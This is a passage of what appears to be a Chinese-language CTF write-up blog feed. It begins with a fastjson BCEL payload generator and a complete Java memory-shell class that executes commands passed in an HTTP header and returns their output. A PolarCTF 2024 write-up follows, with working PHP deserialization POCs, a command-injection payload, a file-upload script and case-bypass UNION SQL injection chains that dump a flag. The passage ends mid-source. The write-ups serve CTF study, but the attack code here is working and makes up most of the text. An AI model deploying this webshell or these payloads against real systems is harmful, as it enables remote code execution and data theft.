class="hljs-string">&quot;C:\\Users\\13664\\Documents\\JavaUtils\\target\\classes\\com\\Memshell\\fastjsonBCEL\\shell.class&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(bytes,<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&#123;\&quot;x\&quot;:&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassLoader\&quot;:&#123; \&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;,\&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span>+code+<span class="hljs-string">&quot;\&quot;&#125;&#125;:\&quot;x\&quot;&#125;&quot;</span>;<br>        System.out.println(s);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>shell.class：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shell</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">v0</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="hljs-string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">v1</span> <span class="hljs-operator">=</span> v0.getMethod(<span class="hljs-string">&quot;getRequestAttributes&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">v2</span> <span class="hljs-operator">=</span> v1.invoke(<span class="hljs-literal">null</span>);<br>            v0 = Thread.currentThread().getContextClassLoader().loadClass(<span class="hljs-string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);<br>            v1 = v0.getMethod(<span class="hljs-string">&quot;getResponse&quot;</span>);<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">v3</span> <span class="hljs-operator">=</span> v0.getMethod(<span class="hljs-string">&quot;getRequest&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">v4</span> <span class="hljs-operator">=</span> v1.invoke(v2);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">v5</span> <span class="hljs-operator">=</span> v3.invoke(v2);<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">v6</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="hljs-string">&quot;javax.servlet.ServletResponse&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;getWriter&quot;</span>);<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">v7</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="hljs-string">&quot;javax.servlet.http.HttpServletRequest&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;getHeader&quot;</span>,String.class);<br>            v7.setAccessible(<span class="hljs-literal">true</span>);<br>            v6.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">v8</span> <span class="hljs-operator">=</span> v6.invoke(v4);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">v9</span> <span class="hljs-operator">=</span> (String) v7.invoke(v5,<span class="hljs-string">&quot;Infernity&quot;</span>);      <span class="hljs-comment">//请求头传参</span><br>            String[] v10 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">3</span>];<br>            <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="hljs-string">&quot;WIN&quot;</span>))&#123;<br>                v10[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;cmd&quot;</span>;<br>                v10[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;/c&quot;</span>;<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                v10[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>                v10[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-c&quot;</span>;<br>            &#125;<br>            v10[<span class="hljs-number">2</span>] = v9;<br>            v8.getClass().getDeclaredMethod(<span class="hljs-string">&quot;println&quot;</span>,String.class).invoke(v8,(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(v10).getInputStream())).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next());<br>            v8.getClass().getDeclaredMethod(<span class="hljs-string">&quot;flush&quot;</span>).invoke(v8);<br>            v8.getClass().getDeclaredMethod(<span class="hljs-string">&quot;clone&quot;</span>).invoke(v8);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>            var11.getStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20241203193423697.png" alt="image-20241203193423697"></p>]]></content>
    
    
    <categories>
      
      <category>WPs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PolarCTF2024春季个人挑战赛全wp</title>
    <link href="/2024/04/30/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/"/>
    <url>/2024/04/30/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/</url>
    
    <content type="html"><![CDATA[<h1 id="机器人"><a href="#机器人" class="headerlink" title="机器人"></a>机器人</h1><p>打开页面：</p><p><img src="/img/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240430154258157.png" alt="image-20240430154258157"></p><p>一眼robots.txt</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>*<br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/27f5e15b6af3223f1176293cd015771d<br><span class="hljs-attribute">Flag</span><span class="hljs-punctuation">: </span>flag&#123;4749ea1ea481a5d<br></code></pre></td></tr></table></figure><p>只有一半，还有一半呢？给了一个路由，我们尝试扫扫这个路由：</p><p><img src="/img/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240430154224192.png" alt="image-20240430154224192"></p><p>进入&#x2F;27f5e15b6af3223f1176293cd015771d&#x2F;flag.php拿到后半段flag</p><blockquote><p>ps：27f5e15b6af3223f1176293cd015771d是robot的md5</p></blockquote><h1 id="PHP反序列化初试"><a href="#PHP反序列化初试" class="headerlink" title="PHP反序列化初试"></a>PHP反序列化初试</h1><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Easy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$evil</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$env</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;env=<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$this</span>-&gt;evil);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;env;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;easy&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;easy&#x27;</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Easy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$evil</span>=<span class="hljs-string">&#x27;cat f*&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$env</span>;              <span class="hljs-comment">//私有属性记得改成公有属性</span><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Easy</span>();<br><span class="hljs-variable">$a</span>-&gt;name = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Evil</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240430155122849.png" alt="image-20240430155122849"></p><h1 id="覆盖"><a href="#覆盖" class="headerlink" title="覆盖"></a>覆盖</h1><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;www.baidu.com&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    @<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$id</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;www.polarctf.com&#x27;</span>) &#123;<br>        <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>        <span class="hljs-variable">$result</span> .= <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ping -c 2 &#x27;</span> . <span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] . <span class="hljs-variable">$ip</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$result&#125;</span>&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;其实很简单！&#x27;</span>);<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>parse_str()这个函数有变量覆盖的作用。</p><p>由于$a[0] &#x3D;&#x3D; ‘<a href="http://www.polarctf.com'，我们希望这里a是一个数组，那么可以传入id=a[]=www.polarctf.com，">www.polarctf.com&#39;，我们希望这里a是一个数组，那么可以传入id=a[]=www.polarctf.com，</a></p><p>后面cmd利用分号闭合前面的命令，在后方执行命令即可：</p><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=a[]=www.polarctf.com&amp;<span class="hljs-attribute">cmd</span>=;cat flag.php<br></code></pre></td></tr></table></figure><p><img src="/img/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240430155748511.png" alt="image-20240430155748511"></p><h1 id="uploader"><a href="#uploader" class="headerlink" title="uploader"></a>uploader</h1><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$sandBox</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$sandBox</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandBox</span>,<span class="hljs-number">0755</span>,<span class="hljs-literal">true</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>)&#123;<br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$sandBox</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传文件名: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件类型: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件大小: &quot;</span> . (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] / <span class="hljs-number">1024</span>) . <span class="hljs-string">&quot; kB&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sandBox</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br></code></pre></td></tr></table></figure><p>搓个文件上传脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://4e9e85b4-8e4f-4e35-b10d-daab160a2546.www.polarctf.com:8090/&#x27;</span><br><br>files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;恶意文件地址&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>)&#125;<br><br>res = requests.post(url=url, files=files)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p><img src="/img/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240430160930551.png" alt="image-20240430160930551"></p><h1 id="search"><a href="#search" class="headerlink" title="search"></a>search</h1><p><img src="/img/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240430161205068.png" alt="image-20240430161205068"></p><p>一眼sql注入，有过滤，先fuzz一下：</p><p>发现过滤了：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-comment">&quot; 空格 if sleep union from where like updatexml extractvalue regexp outfile create drop等</span><br></code></pre></td></tr></table></figure><p>初检查一下，好像没有什么常用的注入方法可以用，关键函数都被过滤了，但是，好像大小写可以绕过哈（</p><p>那普通联合注入就行：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;/**/Union/**/select/**/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="/img/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240430162106592.png" alt="image-20240430162106592"></p><p>利用2回显点</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;<span class="hljs-comment">/**/</span><span class="hljs-built_in">Union</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-built_in">database</span>(),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>%<span class="hljs-number">23</span><br>库是CTF<br></code></pre></td></tr></table></figure><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1&#x27;<span class="hljs-comment">/**/</span>Union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">From</span><span class="hljs-comment">/**/</span>information_schema.tables<span class="hljs-comment">/**/</span><span class="hljs-keyword">Where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-keyword">database</span>()%<span class="hljs-number">23</span><br>表有两个：Flag和Students<br></code></pre></td></tr></table></figure><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1&#x27;<span class="hljs-comment">/**/</span>Union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">From</span><span class="hljs-comment">/**/</span>information_schema.columns<span class="hljs-comment">/**/</span><span class="hljs-keyword">Where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">/**/</span><span class="hljs-keyword">and</span><span class="hljs-comment">/**/</span>table_name=<span class="hljs-string">&#x27;Flag&#x27;</span>%<span class="hljs-number">23</span><br>列名是Flag<br></code></pre></td></tr></table></figure><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;<span class="hljs-comment">/**/</span><span class="hljs-built_in">Union</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,Flag,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span><span class="hljs-comment">/**/</span>From<span class="hljs-comment">/**/</span>CTF.Flag%<span class="hljs-number">23</span><br>flag&#123;Polar_CTF_426891370wxbglbnfwaq&#125;<br></code></pre></td></tr></table></figure><h1 id="file"><a href="#file" class="headerlink" title="file"></a>file</h1><p>扫一遍发现了uploaded目录和upload.php，直接进去upload.php。</p><p>随便传一个马，发现uploaded目录没有，题目前端提示上传文件尝试把Content-Type改成image&#x2F;jpeg</p><p><img src="/img/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240430163627134.png" alt="image-20240430163627134"></p><p><img src="/img/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240430163635059.png" alt="image-20240430163635059"></p><h1 id="PlayGame"><a href="#PlayGame" class="headerlink" title="PlayGame"></a>PlayGame</h1><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sex</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;name:&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name.<span class="hljs-string">&quot;age:&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;age.<span class="hljs-string">&quot;sex:&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;sex;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setName</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setAge</span>(<span class="hljs-params"><span class="hljs-variable">$age</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$age</span>=<span class="hljs-variable">$age</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setSex</span>(<span class="hljs-params"><span class="hljs-variable">$sex</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$sex</span>=<span class="hljs-variable">$sex</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PlayGame</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$gameFile</span>=<span class="hljs-string">&quot;./game&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">openGame</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;gameFile);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;user-&gt;name.<span class="hljs-string">&quot;GameOver!&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user-&gt;name.<span class="hljs-string">&quot;PlayGame &quot;</span>. <span class="hljs-variable language_">$this</span>-&gt;user-&gt;age . <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">openGame</span>();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;polar_flag.flag&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;polar_flag.flag&#x27;</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; 